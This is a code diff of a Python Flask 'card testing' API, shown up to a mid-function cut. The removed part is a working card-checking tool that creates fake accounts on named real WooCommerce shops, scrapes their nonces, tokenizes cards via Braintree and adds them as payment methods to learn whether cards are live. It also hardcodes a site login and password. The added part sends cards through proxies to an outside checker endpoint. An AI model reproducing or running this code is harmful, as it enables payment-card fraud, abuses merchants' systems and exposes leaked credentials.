@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
 ==============================================================
-  AUTO BRAINTREE FLASK API - ULTRA-ROBUST VERSION
-  Aggressively handles all site configurations and errors
+  RAZORPAY CARD TESTING API
+  Tests cards against Razorpay payment gateway
 ==============================================================
 """
 
-from flask import Flask, jsonify
+from flask import Flask, jsonify, request
 import asyncio
 import aiohttp
 import json
@@ -34,101 +34,8 @@ fake = Faker('en_US')
 # CONFIGURATION
 # ============================================================
 
-# URL patterns to try for each site
-URL_PATTERNS = [
-    {
-        'name': 'Standard WooCommerce',
-        'register_url': '/my-account/',
-        'address_url': '/my-account/edit-address/billing/',
-        'payment_url': '/my-account/add-payment-method/',
-        'payment_method': 'braintree_credit_card'
-    },
-    {
-        'name': 'Customer Account',
-        'register_url': '/customer-account/?action=register',
-        'address_url': '/customer-account/edit-address/billing/',
-        'payment_url': '/customer-account/add-payment-method/',
-        'payment_method': 'braintree_cc'
-    },
-    {
-        'name': 'Account Path',
-        'register_url': '/account/register/',
-        'address_url': '/account/edit-address/billing/',
-        'payment_url': '/account/add-payment-method/',
-        'payment_method': 'braintree_credit_card'
-    },
-    {
-        'name': 'WooCommerce Register',
-        'register_url': '/wp-login.php?action=register',
-        'address_url': '/my-account/edit-address/billing/',
-        'payment_url': '/my-account/add-payment-method/',
-        'payment_method': 'braintree_credit_card'
-    },
-    {
-        'name': 'Checkout Register',
-        'register_url': '/checkout/',
-        'address_url': '/my-account/edit-address/billing/',
-        'payment_url': '/my-account/add-payment-method/',
-        'payment_method': 'braintree_credit_card'
-    },
-    {
-        'name': 'Direct Register',
-        'register_url': '/register/',
-        'address_url': '/my-account/edit-address/billing/',
-        'payment_url': '/my-account/add-payment-method/',
-        'payment_method': 'braintree_credit_card'
-    },
-    {
-        'name': 'Sign Up',
-        'register_url': '/sign-up/',
-        'address_url': '/my-account/edit-address/billing/',
-        'payment_url': '/my-account/add-payment-method/',
-        'payment_method': 'braintree_credit_card'
-    },
-    {
-        'name': 'Create Account',
-        'register_url': '/create-account/',
-        'address_url': '/my-account/edit-address/billing/',
-        'payment_url': '/my-account/add-payment-method/',
-        'payment_method': 'braintree_credit_card'
-    }
-]
-
-# Payment method variations to try
-PAYMENT_METHODS = ['braintree_credit_card', 'braintree_cc', 'braintree', 'wc_braintree_credit_card', 'paypal', 'stripe']
-
-# Default sites list
-DEFAULT_SITES = [
-    'parts.lagunatools.com',
-    'atelieroffineart.com'
-]
-
-# Known working configurations (cache)
-KNOWN_CONFIGS = {
-    'parts.lagunatools.com': {
-        'register_url': '/customer-account/?action=register',
-        'address_url': '/customer-account/edit-address/billing/',
-        'payment_url': '/customer-account/add-payment-method/',
-        'payment_method': 'braintree_cc'
-    },
-    'assurancehomehealthcare.ca': {
-        'register_url': '/my-account/',
-        'address_url': '/my-account/edit-address/billing/',
-        'payment_url': '/my-account/add-payment-method/',
-        'payment_method': 'braintree_credit_card',
-        'use_login': True,
-        'email': 'keygenmd5@gmail.com',
-        'password': 'PK4hTkbtP8hHsgf'
-    }
-}
-
-# Card test data - try different card types systematically
-TEST_CARDS = [
-    "4111111111111111|12|25|123",  # Visa test card
-    "5555555555554444|12|25|123",  # Mastercard test card
-    "378282246310005|12|25|1234",  # Amex test card
-    "6011111111111117|12|25|123",  # Discover test card
-]
+# Razorpay test endpoint (this would be your actual Razorpay testing endpoint)
+RAZORPAY_TEST_ENDPOINT = "https://mydom.arpitchk.shop/autorz.php/"
 
 # ============================================================
 # UTILITY FUNCTIONS
@@ -156,914 +63,134 @@ def validate_cc(cc):
     except:
         return False, "Error"
 
-def get_card_type(card_number):
-    """Get card brand"""
-    card_number = str(card_number)
-    if card_number.startswith('4'):
-        return 'visa'
-    elif card_number.startswith(('51', '52', '53', '54', '55')):
-        return 'mastercard'
-    elif card_number.startswith(('34', '37')):
-        return 'amex'
-    elif card_number.startswith(('6011', '65', '64', '60')):
-        return 'discover'
-    else:
-        return 'unknown'
-
-def generate_user_data():
-    """Generate realistic user data"""
-    first_name = fake.first_name()
-    last_name = fake.last_name()
-    return {
-        'first_name': first_name,
-        'last_name': last_name,
-        'email': f"{first_name.lower()}{last_name.lower()}{random.randint(100,999)}@gmail.com",
-        'password': f"{fake.word()}{random.randint(1000,9999)}{fake.word()}",
-        'phone': f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}",
-        'address': fake.street_address(),
-        'city': 'New York',
-        'state': 'NY',
-        'zipcode': '10080'
-    }
-
-def extract_domain(url):
-    """Extract domain"""
+def parse_proxy(proxy_str):
+    """Parse proxy string into components"""
     try:
-        if not url.startswith(('http://', 'https://')):
-            url = f'https://{url}'
-        from urllib.parse import urlparse
-        parsed = urlparse(url)
-        domain = parsed.netloc or parsed.path
-        return domain.replace('www.', '')
+        # Expected format: user:password@ip:port
+        if '@' in proxy_str and ':' in proxy_str:
+            user_pass, ip_port = proxy_str.split('@', 1)
+            if ':' in user_pass and ':' in ip_port:
+                username, password = user_pass.split(':', 1)
+                ip, port = ip_port.split(':', 1)
+                return {
+                    'username': username,
+                    'password': password,
+                    'ip': ip,
+                    'port': port
+                }
     except:
-        return url
-
-def find_between(data, first, last):
-    """Extract text between delimiters"""
-    try:
-        start = data.index(first) + len(first)
-        end = data.index(last, start)
-        return data[start:end]
-    except:
-        return None
+        pass
+    return None
 
 # ============================================================
-# SMART BRAINTREE CHECKER WITH AUTO-DETECTION
+# RAZORPAY CHECKER
 # ============================================================
 
-class SmartBraintreeChecker:
-    """Smart Braintree checker that auto-detects URL patterns"""
+class RazorpayChecker:
+    """Razorpay card checker"""
     
-    def __init__(self, domain):
-        self.domain = domain
-        self.base_url = f'https://{domain}'
-        self.timeout = aiohttp.ClientTimeout(total=30)
-        self.session = None
-        self.detected_config = None
+    def __init__(self, proxy=None):
+        self.proxy = proxy
         self.base_headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'user-agent': 'Mozilla/5.0 (Linux; Android 15; RMX3771) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
         }
+        self.session = None
     
     async def __aenter__(self):
         connector = aiohttp.TCPConnector(ssl=False)
-        self.session = aiohttp.ClientSession(
-            connector=connector,
-            timeout=self.timeout,
-            cookie_jar=aiohttp.CookieJar()
-        )
+        if self.proxy:
+            proxy_url = f"http://{self.proxy['username']}:{self.proxy['password']}@{self.proxy['ip']}:{self.proxy['port']}"
+            self.session = aiohttp.ClientSession(
+                connector=connector,
+                timeout=aiohttp.ClientTimeout(total=30),
+                cookie_jar=aiohttp.CookieJar(),
+                proxy=proxy_url
+            )
+        else:
+            self.session = aiohttp.ClientSession(
+                connector=connector,
+                timeout=aiohttp.ClientTimeout(total=30),
+                cookie_jar=aiohttp.CookieJar()
+            )
         return self
     
     async def __aexit__(self, exc_type, exc_val, exc_tb):
         if self.session:
             await self.session.close()
     
-    def extract_tokens(self, html):
-        """Extract CSRF tokens from HTML"""
-        tokens = {}
-        patterns = {
-            'register_nonce': r'name="woocommerce-register-nonce" value="([^"]+)"',
-            'login_nonce': r'name="woocommerce-login-nonce" value="([^"]+)"',
-            'edit_address_nonce': r'name="woocommerce-edit-address-nonce" value="([^"]+)"',
-            'add_payment_nonce': r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
-            'wp_referer': r'name="_wp_http_referer" value="([^"]+)"',
-            'security': r'name="security" value="([^"]+)"',
-            'woocommerce-process-login-nonce': r'name="woocommerce-process-login-nonce" value="([^"]+)"',
-            'woocommerce-process-register-nonce': r'name="woocommerce-process-register-nonce" value="([^"]+)"',
-            'wc_nonce': r'name="wc_nonce" value="([^"]+)"',
-            'woocommercenonce': r'name="woocommercenonce" value="([^"]+)"'
-        }
-        for key, pattern in patterns.items():
-            match = re.search(pattern, html)
-            tokens[key] = match.group(1) if match else None
-        return tokens
-    
-    async def detect_braintree_config(self):
-        """Auto-detect Braintree configuration for this site"""
-        logger.info(f"Auto-detecting Braintree config for {self.domain}")
-        
-        # Check if we have a known config
-        if self.domain in KNOWN_CONFIGS:
-            self.detected_config = KNOWN_CONFIGS[self.domain]
-            logger.info(f"Using known config for {self.domain}")
-            return True
-        
-        # Try all URL patterns
-        for pattern in URL_PATTERNS:
-            try:
-                payment_url = f"{self.base_url}{pattern['payment_url']}"
-                
-                headers = self.base_headers.copy()
-                async with self.session.get(payment_url, headers=headers, allow_redirects=False) as response:
-                    # Check if page exists (200) or redirects to login (302)
-                    if response.status in [200, 302]:
-                        html = await response.text() if response.status == 200 else ""
-                        
-                        # Check for Braintree indicators
-                        if any(indicator in html.lower() for indicator in ['braintree', 'braintree_client_token', 'wc-braintree']):
-                            logger.info(f"Detected Braintree on {payment_url} using pattern: {pattern['name']}")
-                            self.detected_config = pattern.copy()
-                            return True
-                
-            except Exception as e:
-                logger.debug(f"Pattern {pattern['name']} failed: {str(e)[:50]}")
-                continue
-        
-        # If no pattern worked, use default
-        logger.info(f"Using default pattern for {self.domain}")
-        self.detected_config = URL_PATTERNS[0].copy()
-        return True
-    
-    async def get_page(self, url, referer=None):
-        """Get page content"""
+    async def test_card(self, cc_data):
+        """Test card against Razorpay"""
         try:
-            headers = self.base_headers.copy()
-            if referer:
-                headers['referer'] = referer
-            async with self.session.get(url, headers=headers, allow_redirects=True) as response:
-                return True, await response.text()
-        except Exception as e:
-            return False, str(e)
-    
-    async def register_account(self, user_data):
-        """Register new account with smart retry logic"""
-        try:
-            logger.info(f"Registering: {user_data['email']}")
-            
-            # Try multiple approaches
-            approaches = [
-                self._try_registration_form,
-                self._try_checkout_page,
-                self._try_login_page,
-                self._try_direct_registration
-            ]
-            
-            for approach in approaches:
-                try:
-                    success, result = await approach(user_data)
-                    if success:
-                        logger.info(f"Registration successful using {approach.__name__}")
-                        return True, result
-                except Exception as e:
-                    logger.debug(f"Approach {approach.__name__} failed: {str(e)[:50]}")
-                    continue
-            
-            return False, "All registration approaches failed"
-            
-        except Exception as e:
-            return False, f"Registration error: {str(e)[:50]}"
-    
-    async def _try_registration_form(self, user_data):
-        """Try standard registration form"""
-        reg_urls = [
-            f"{self.base_url}{self.detected_config['register_url']}",
-            f"{self.base_url}/my-account/",
-            f"{self.base_url}/customer-account/?action=register",
-            f"{self.base_url}/account/register/",
-            f"{self.base_url}/wp-login.php?action=register",
-            f"{self.base_url}/register/",
-            f"{self.base_url}/sign-up/",
-            f"{self.base_url}/create-account/",
-            f"{self.base_url}/join/",
-            f"{self.base_url}/signup/"
-        ]
-        
-        for reg_url in reg_urls:
-            try:
-                success, html = await self.get_page(reg_url)
-                if success:
-                    # Check for registration form indicators
-                    form_indicators = [
-                        'woocommerce-register-nonce',
-                        'reg_username',
-                        'reg_password', 
-                        'register',
-                        'wp-login.php?action=register',
-                        'checkout',
-                        'woocommerce-process-register-nonce',
-                        'security',
-                        'wc_nonce',
-                        'woocommercenonce'
-                    ]
-                    if any(indicator in html for indicator in form_indicators):
-                        # Try to find token
-                        tokens = self.extract_tokens(html)
-                        
-                        # Try multiple token sources
-                        register_nonce = None
-                        register_nonce = tokens.get('register_nonce') or tokens.get('woocommerce-process-register-nonce')
-                        register_nonce = register_nonce or tokens.get('security') or tokens.get('wc_nonce') or tokens.get('woocommercenonce')
-                        register_nonce = register_nonce or tokens.get('login_nonce') or tokens.get('edit_address_nonce')
-                        
-                        if not register_nonce:
-                            # Try JavaScript token extraction
-                            js_patterns = [
-                                r'woocommerce_register_nonce\s*=\s*["\']([^"\']+)["\']',
-                                r'register_nonce\s*=\s*["\']([^"\']+)["\']',
-                                r'var\s+registerNonce\s*=\s*["\']([^"\']+)["\']'
-                            ]
-                            for pattern in js_patterns:
-                                match = re.search(pattern, html)
-                                if match:
-                                    register_nonce = match.group(1)
-                                    break
-                        
-                        if not register_nonce:
-                            continue
-                        
-                        headers = self.base_headers.copy()
-                        headers.update({
-                            'content-type': 'application/x-www-form-urlencoded',
-                            'origin': self.base_url,
-                            'referer': reg_url
-                        })
-                        
-                        # Build comprehensive form
-                        form_data = {
-                            'email': user_data['email'],
-                            'woocommerce-register-nonce': register_nonce,
-                            '_wp_http_referer': '/',
-                            'register': 'Register'
-                        }
-                        
-                        # Add all possible fields
-                        possible_fields = {
-                            'username': user_data['email'].split('@')[0],
-                            'password': user_data['password'],
-                            'email_2': user_data['email'],
-                            'first_name': user_data['first_name'],
-                            'last_name': user_data['last_name'],
-                            'billing_first_name': user_data['first_name'],
-                            'billing_last_name': user_data['last_name'],
-                            'billing_company': f"{user_data['first_name']} {user_data['last_name']}",
-                            'billing_address_1': user_data['address'],
-                            'billing_address_2': '',
-                            'billing_city': user_data['city'],
-                            'billing_state': user_data['state'],
-                            'billing_postcode': user_data['zipcode'],
-                            'billing_country': 'US',
-                            'billing_phone': user_data['phone'],
-                            'billing_email': user_data['email'],
-                            'reg_username': user_data['email'].split('@')[0],
-                            'reg_password': user_data['password'],
-                            'woocommerce-process-register-nonce': register_nonce,
-                            'security': register_nonce,
-                            'woocommerce-login-nonce': tokens.get('login_nonce', register_nonce),
-                            'wc_nonce': register_nonce,
-                            'woocommercenonce': register_nonce
-                        }
-                        
-                        # Add only existing fields
-                        for field, value in possible_fields.items():
-                            if f'name="{field}"' in html:
-                                form_data[field] = value
-                        
-                        data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
-                        
-                        async with self.session.post(reg_url, headers=headers, data=data_str, allow_redirects=True) as response:
-                            result = await response.text()
-                            final_url = str(response.url)
-                            
-                            # Check success indicators
-                            success_indicators = ['Log out', 'logout', 'Dashboard', 'My Account', 'my-account/edit-address', 
-                                               'account-created', 'registration-completed', 'logged in', 'welcome',
-                                               'account dashboard', 'profile', 'dashboard']
-                            if any(x in result for x in success_indicators):
-                                if 'login' not in final_url.lower() or 'my-account' in final_url.lower():
-                                    return True, user_data
-                            
-                            # Check if we're on account page
-                            if 'my-account' in final_url.lower():
-                                return True, user_data
-                            
-                            # Try login if redirected
-                            if 'login' in final_url.lower():
-                                return await self._try_login(user_data)
-                        
-                        return False, "Registration form submission failed"
-                
-            except:
-                continue
-        
-        return False, "No registration form found"
-    
-    async def _try_checkout_page(self, user_data):
-        """Try to use checkout page for registration"""
-        try:
-            checkout_url = f"{self.base_url}/checkout/"
-            success, html = await self.get_page(checkout_url)
-            if not success:
-                return False, "Checkout page not accessible"
-            
-            # Look for checkout form
-            if 'woocommerce-checkout' in html or 'checkout' in html:
-                # Try to fill checkout form
-                form_data = {
-                    'billing_first_name': user_data['first_name'],
-                    'billing_last_name': user_data['last_name'],
-                    'billing_company': f"{user_data['first_name']} {user_data['last_name']}",
-                    'billing_address_1': user_data['address'],
-                    'billing_address_2': '',
-                    'billing_city': user_data['city'],
-                    'billing_state': user_data['state'],
-                    'billing_postcode': user_data['zipcode'],
-                    'billing_country': 'US',
-                    'billing_email': user_data['email'],
-                    'billing_phone': user_data['phone'],
-                    'create_account': '1',
-                    'woocommerce-process-checkout-nonce': '1',
-                    'woocommerce_checkout_update_order_review': 'Update Order Review'
-                }
-                
-                headers = self.base_headers.copy()
-                headers.update({
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'origin': self.base_url,
-                    'referer': checkout_url
-                })
-                
-                data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
-                
-                async with self.session.post(checkout_url, headers=headers, data=data_str, allow_redirects=True) as response:
-                    result = await response.text()
-                    final_url = str(response.url)
-                    
-                    if 'my-account' in final_url.lower() or 'order-received' in final_url.lower():
-                        return True, user_data
-                    
-                    return False, "Checkout registration failed"
-            
-            return False, "No checkout form found"
-        
-        except Exception as e:
-            return False, f"Checkout error: {str(e)[:50]}"
-    
-    async def _try_login_page(self, user_data):
-        """Try to use login page and create account"""
-        try:
-            login_url = f"{self.base_url}/my-account/"
-            success, html = await self.get_page(login_url)
-            if not success:
-                return False, "Login page not accessible"
-            
-            # Look for "Create account" link
-            if 'create account' in html.lower() or 'register' in html.lower():
-                # Try to click create account link
-                create_account_link = None
-                soup = BeautifulSoup(html, 'html.parser')
-                links = soup.find_all('a', href=True)
-                for link in links:
-                    if 'register' in link.get('href', '').lower() or 'create account' in link.get_text().lower():
-                        create_account_link = link.get('href')
-                        break
-                
-                if create_account_link:
-                    # Follow the create account link
-                    success, html = await self.get_page(create_account_link)
-                    if success:
-                        return await self._try_registration_form(user_data)
-                
-                # Try to submit login form first
-                return await self._try_login(user_data)
-            
-            return False, "No create account link found"
-        
-        except Exception as e:
-            return False, f"Login page error: {str(e)[:50]}"
-    
-    async def _try_direct_registration(self, user_data):
-        """Try direct registration approaches"""
-        try:
-            # Try to access account page directly
-            account_url = f"{self.base_url}/my-account/"
-            success, html = await self.get_page(account_url)
-            if success:
-                # Look for registration form on account page
-                if 'woocommerce-register-nonce' in html or 'register' in html:
-                    return await self._try_registration_form(user_data)
-                
-                # Try to login
-                return await self._try_login(user_data)
-            
-            return False, "Direct registration failed"
-        
-        except Exception as e:
-            return False, f"Direct registration error: {str(e)[:50]}"
-    
-    async def _try_login(self, user_data):
-        """Try to login with credentials"""
-        try:
-            login_url = f"{self.base_url}/my-account/"
-            headers = self.base_headers.copy()
-            
-            form_data = {
-                'username': user_data['email'],
-                'password': user_data['password'],
-                'woocommerce-login-nonce': 'login',
-                'login': 'Login'
-            }
-            
-            data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
-            
-            async with self.session.post(login_url, headers=headers, data=data_str, allow_redirects=True) as response:
-                result = await response.text()
-                if 'Log out' in result or 'logout' in result or 'my-account' in str(response.url):
-                    logger.info("Login successful")
-                    return True, user_data
-                return False, "Login failed"
-        except Exception as e:
-            return False, f"Login error: {str(e)[:50]}"
-
-    
-    async def update_billing_address(self, user_data):
-        """Update billing address with auto-detection"""
-        try:
-            logger.info("Updating billing address")
-            
-            # Try multiple address URLs
-            address_urls = [
-                f"{self.base_url}{self.detected_config['address_url']}",
-                f"{self.base_url}/my-account/edit-address/",
-                f"{self.base_url}/customer-account/edit-address/",
-                f"{self.base_url}/account/edit-address/",
-                f"{self.base_url}/edit-address/",
-                f"{self.base_url}/billing-address/",
-                f"{self.base_url}/address/",
-                f"{self.base_url}/profile/",
-                f"{self.base_url}/account/details/",
-                f"{self.base_url}/account/settings/",
-                f"{self.base_url}/user/profile/"
-            ]
-            
-            for edit_url in address_urls:
-                try:
-                    success, html = await self.get_page(edit_url)
-                    if not success:
-                        continue
-                    
-                    tokens = self.extract_tokens(html)
-                    
-                    # Try multiple token sources
-                    edit_address_nonce = None
-                    edit_address_nonce = tokens.get('edit_address_nonce')
-                    if not edit_address_nonce:
-                        edit_address_nonce = tokens.get('woocommerce-process-login-nonce')
-                    if not edit_address_nonce:
-                        edit_address_nonce = tokens.get('security')
-                    if not edit_address_nonce:
-                        edit_address_nonce = tokens.get('wc_nonce')
-                    if not edit_address_nonce:
-                        edit_address_nonce = tokens.get('woocommercenonce')
-                    if not edit_address_nonce:
-                        edit_address_nonce = tokens.get('login_nonce')
-                    if not edit_address_nonce:
-                        edit_address_nonce = tokens.get('register_nonce')
-                    
-                    if not edit_address_nonce:
-                        continue
-                    
-                    headers = self.base_headers.copy()
-                    headers.update({
-                        'content-type': 'application/x-www-form-urlencoded',
-                        'origin': self.base_url,
-                        'referer': edit_url
-                    })
-                    
-                    # Build comprehensive address form
-                    form_data = {
-                        'billing_first_name': user_data['first_name'],
-                        'billing_last_name': user_data['last_name'],
-                        'billing_company': f"{user_data['first_name']} {user_data['last_name']}",
-                        'billing_address_1': user_data['address'],
-                        'billing_address_2': '',
-                        'billing_city': user_data['city'],
-                        'billing_state': user_data['state'],
-                        'billing_postcode': user_data['zipcode'],
-                        'billing_country': 'US',
-                        'billing_phone': user_data['phone'],
-                        'billing_email': user_data['email'],
-                        'save_address': 'Save address',
-                        'woocommerce-edit-address-nonce': edit_address_nonce,
-                        '_wp_http_referer': tokens.get('wp_referer', '/my-account/'),
-                        'action': 'edit_address'
-                    }
-                    
-                    # Add all possible address fields
-                    possible_address_fields = {
-                        'billing_company': f"{user_data['first_name']} {user_data['last_name']}",
-                        'billing_address_2': '',
-                        'billing_city': user_data['city'],
-                        'billing_state': user_data['state'],
-                        'billing_postcode': user_data['zipcode'],
-                        'billing_country': 'US',
-                        'billing_phone': user_data['phone'],
-                        'billing_email': user_data['email'],
-                        'shipping_first_name': user_data['first_name'],
-                        'shipping_last_name': user_data['last_name'],
-                        'shipping_company': f"{user_data['first_name']} {user_data['last_name']}",
-                        'shipping_address_1': user_data['address'],
-                        'shipping_address_2': '',
-                        'shipping_city': user_data['city'],
-                        'shipping_state': user_data['state'],
-                        'shipping_postcode': user_data['zipcode'],
-                        'shipping_country': 'US',
-                        'shipping_phone': user_data['phone'],
-                        'shipping_email': user_data['email']
-                    }
-                    
-                    # Add only existing fields
-                    for field, value in possible_address_fields.items():
-                        if f'name="{field}"' in html:
-                            form_data[field] = value
-                    
-                    data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
-                    
-                    async with self.session.post(edit_url, headers=headers, data=data_str) as response:
-                        result = await response.text()
-                        if ("successfully" in result.lower() or "changed" in result.lower() or 
-                            "updated" in result.lower() or "saved" in result.lower() or
-                            "address updated" in result.lower()):
-                            logger.info("Address updated")
-                            return True, "Success"
-                        
-                        # Retry with more comprehensive data
-                        if "addresses must have at least one field filled in" in result.lower():
-                            form_data['billing_address_1'] = user_data['address']
-                            form_data['billing_city'] = user_data['city']
-                            form_data['billing_state'] = user_data['state']
-                            form_data['billing_postcode'] = user_data['zipcode']
-                            form_data['billing_country'] = 'US'
-                            form_data['billing_phone'] = user_data['phone']
-                            form_data['billing_email'] = user_data['email']
-                            
-                            data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in form_data.items()])
-                            
-                            async with self.session.post(edit_url, headers=headers, data=data_str) as response2:
-                                result2 = await response2.text()
-                                if ("successfully" in result2.lower() or "changed" in result2.lower() or 
-                                    "updated" in result2.lower() or "saved" in result2.lower()):
-                                    logger.info("Address updated on second attempt")
-                                    return True, "Success"
-                        
-                        return False, "Failed"
-                
-                except:
-                    continue
-            
-            return False, "No address page accessible"
-        
-        except Exception as e:
-            return False, f"Error: {str(e)[:50]}"
-    
-    def site_response(self, result):
-        """Parse WooCommerce response"""
-        try:
-            soup = BeautifulSoup(result, 'html.parser')
-            
-            # Check for error
-            error_container = soup.find('ul', class_='woocommerce-error')
-            if error_container:
-                error_items = error_container.find_all('li')
-                for error_item in error_items:
-                    error_text = error_item.get_text(strip=True)
-                    if error_text:
-                        return f"Declined: {error_text}"
-                return "Declined: Unknown error"
-            
-            # Check for success
-            success_container = soup.find('div', class_='woocommerce-message')
-            if success_container:
-                return "Approved: Payment method added successfully"
-            
-            # Check text content
-            if 'payment method was successfully added' in result.lower():
-                return "Approved: Payment method added"
-            
-            # Check for specific Braintree errors
-            if 'credit card type is not accepted' in result.lower():
-                return "Declined: Credit card type not accepted"
-            if 'verifications are not supported' in result.lower():
-                return "Declined: Verifications not supported"
-            if 'addresses must have at least one field filled in' in result.lower():
-                return "Declined: Address validation failed"
-            if 'invalid card number' in result.lower():
-                return "Declined: Invalid card number"
-            if 'expired card' in result.lower():
-                return "Declined: Expired card"
-            if 'insufficient funds' in result.lower():
-                return "Declined: Insufficient funds"
-            if 'card declined' in result.lower():
-                return "Declined: Card declined"
-            if 'address validation failed' in result.lower():
-                return "Declined: Address validation failed"
-            if 'billing address is invalid' in result.lower():
-                return "Declined: Billing address invalid"
-            
-            return "Unknown Response"
-        except:
-            return "Parse error"
-    
-    async def get_payment_nonces(self):
-        """Get payment nonces with AJAX fallback"""
-        try:
-            payment_url = f"{self.base_url}{self.detected_config['payment_url']}"
-            headers = self.base_headers.copy()
-            
-            async with self.session.get(payment_url, headers=headers, allow_redirects=True) as response:
-                html = await response.text()
-                final_url = str(response.url)
-                
-                # Check if redirected to login
-                if 'login' in final_url.lower() and 'add-payment' not in final_url.lower():
-                    return None, None, "Requires authentication"
-                
-                # Extract tokens
-                tokens = self.extract_tokens(html)
-                add_payment_nonce = None
-                
-                # Try multiple token sources
-                add_payment_nonce = tokens.get('add_payment_nonce')
-                if not add_payment_nonce:
-                    add_payment_nonce = tokens.get('woocommerce-process-login-nonce')
-                if not add_payment_nonce:
-                    add_payment_nonce = tokens.get('security')
-                if not add_payment_nonce:
-                    add_payment_nonce = tokens.get('wc_nonce')
-                if not add_payment_nonce:
-                    add_payment_nonce = tokens.get('woocommercenonce')
-                if not add_payment_nonce:
-                    add_payment_nonce = tokens.get('login_nonce')
-                if not add_payment_nonce:
-                    add_payment_nonce = tokens.get('register_nonce')
-                if not add_payment_nonce:
-                    add_payment_nonce = tokens.get('edit_address_nonce')
-                
-                if not add_payment_nonce:
-                    return None, None, "No payment nonce found"
-                
-                # Try to extract embedded client token
-                patterns = [
-                    r'braintree_client_token\s*=\s*\["([^"]+)"\]',
-                    r'var\s+clientToken\s*=\s*["\']([^"\']+)["\']',
-                    r'["\']clientToken["\']:\s*["\']([^"\']+)["\']'
-                ]
-                
-                client_token = None
-                for pattern in patterns:
-                    match = re.search(pattern, html)
-                    if match:
-                        client_token = match.group(1)
-                        break
-                
-                # If no embedded token, try AJAX
-                if not client_token:
-                    client_nonce_match = re.search(r'"client_token_nonce":"([^"]+)"', html)
-                    if client_nonce_match:
-                        client_nonce = client_nonce_match.group(1)
-                        
-                        ajax_headers = {
-                            'accept': '*/*',
-                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                            'user-agent': self.base_headers['user-agent'],
-                            'x-requested-with': 'XMLHttpRequest',
-                            'origin': self.base_url,
-                            'referer': payment_url
-                        }
-                        
-                        ajax_data = {
-                            'action': 'wc_braintree_credit_card_get_client_token',
-                            'nonce': client_nonce
-                        }
-                        
-                        data_str = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in ajax_data.items()])
-                        
-                        async with self.session.post(
-                            f'{self.base_url}/wp-admin/admin-ajax.php',
-                            headers=ajax_headers,
-                            data=data_str
-                        ) as ajax_response:
-                            if ajax_response.status == 200:
-                                ajax_result = await ajax_response.json()
-                                if ajax_result.get('success'):
-                                    client_token = ajax_result.get('data')
-                
-                return add_payment_nonce, client_token, None
-        except Exception as e:
-            return None, None, f"Nonces error: {str(e)[:50]}"
-    
-    async def decode_client_token(self, client_token):
-        """Decode client token"""
-        try:
-            decoded = json.loads(base64.b64decode(client_token).decode('utf-8'))
-            return decoded.get('authorizationFingerprint')
-        except:
-            return None
-    
-    async def tokenize_cc(self, auth, num, mm, yy, cvc, zipcode):
-        """Tokenize card with Braintree"""
-        try:
-            if len(yy) == 2:
-                yy = str(datetime.now().year // 100) + yy
-            
-            headers = {
-                'authority': 'payments.braintree-api.com',
-                'accept': '*/*',
-                'authorization': f'Bearer {auth}',
-                'braintree-version': '2018-05-10',
-                'content-type': 'application/json',
-                'origin': 'https://assets.braintreegateway.com',
-                'user-agent': self.base_headers['user-agent']
-            }
-            
-            payload = {
-                "clientSdkMetadata": {
-                    "source": "client",
-                    "integration": "custom",
-                    "sessionId": hashlib.md5(str(time.time()).encode()).hexdigest()[:36]
-                },
-                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }",
-                "variables": {
-                    "input": {
-                        "creditCard": {
-                            "number": num,
-                            "expirationMonth": mm,
-                            "expirationYear": yy,
-                            "cvv": cvc,
-                            "billingAddress": {"postalCode": zipcode}
-                        },
-                        "options": {"validate": False}
-                    }
-                },
-                "operationName": "TokenizeCreditCard"
-            }
-            
-            connector = aiohttp.TCPConnector(ssl=False)
-            async with aiohttp.ClientSession(connector=connector) as temp:
-                async with temp.post('https://payments.braintree-api.com/graphql', headers=headers, json=payload, timeout=aiohttp.ClientTimeout(total=20)) as response:
-                    result = await response.json()
-                    if response.status == 200 and 'data' in result:
-                        token = result['data']['tokenizeCreditCard']['token']
-                        return {'success': True, 'token': token}
-                    else:
-                        error = result.get('errors', [{}])[0].get('message', 'Tokenization failed')
-                        return {'success': False, 'error': error}
-        except Exception as e:
-            return {'success': False, 'error': str(e)[:50]}
-    
-    async def add_payment_method(self, add_payment_nonce, payment_token):
-        """Add payment method with flexible payment method detection"""
-        try:
-            headers = {
-                'accept': 'text/html,*/*',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': self.base_url,
-                'referer': f"{self.base_url}{self.detected_config['payment_url']}",
-                'user-agent': self.base_headers['user-agent']
-            }
-            
-            payment_method = self.detected_config['payment_method']
-            
-            # Build form data based on payment method type
-            if payment_method == 'braintree_cc':
-                data = {
-                    'payment_method': 'braintree_cc',
-                    'braintree_cc_nonce_key': payment_token,
-                    'braintree_cc_device_data': json.dumps({"correlation_id": hashlib.md5(str(time.time()).encode()).hexdigest()}),
-                    'braintree_cc_3ds_nonce_key': '',
-                    'woocommerce-add-payment-method-nonce': add_payment_nonce,
-                    '_wp_http_referer': self.detected_config['payment_url'],
-                    'woocommerce_add_payment_method': '1'
-                }
-            else:
-                data = {
-                    'payment_method': payment_method,
-                    f'wc-{payment_method}-card-type': 'visa',
-                    f'wc_{payment_method}_payment_nonce': payment_token,
-                    f'wc_{payment_method}_device_data': json.dumps({"correlation_id": hashlib.md5(str(time.time()).encode()).hexdigest()}),
-                    f'wc-{payment_method}-tokenize-payment-method': 'true',
-                    'woocommerce-add-payment-method-nonce': add_payment_nonce,
-                    '_wp_http_referer': self.detected_config['payment_url'],
-                    'woocommerce_add_payment_method': '1'
-                }
-            
-            encoded = '&'.join([f'{k}={urllib.parse.quote(str(v))}' for k, v in data.items()])
-            
